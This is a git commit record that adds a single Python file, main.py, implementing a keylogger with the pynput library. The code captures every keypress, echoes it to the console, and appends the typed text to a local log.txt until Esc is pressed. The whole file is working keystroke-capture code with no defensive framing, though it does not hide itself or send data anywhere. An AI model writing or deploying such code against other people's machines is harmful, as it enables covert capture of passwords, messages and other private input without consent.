c926b67907093aea0ab6c6e8722e1c1ded9a418a
mayazennoun <zennounmaya@gmail.com>
2026-04-04 16:00:54 +0100

    Initial commit with clean repo and .gitignore

---
+++ main.py
@@ -0,0 +1,34 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print(f"{key} pressed")
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if "space" in k:
+                f.write(" ")
+            elif "enter" in k:
+                f.write("\n")
+            elif "Key" not in k:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
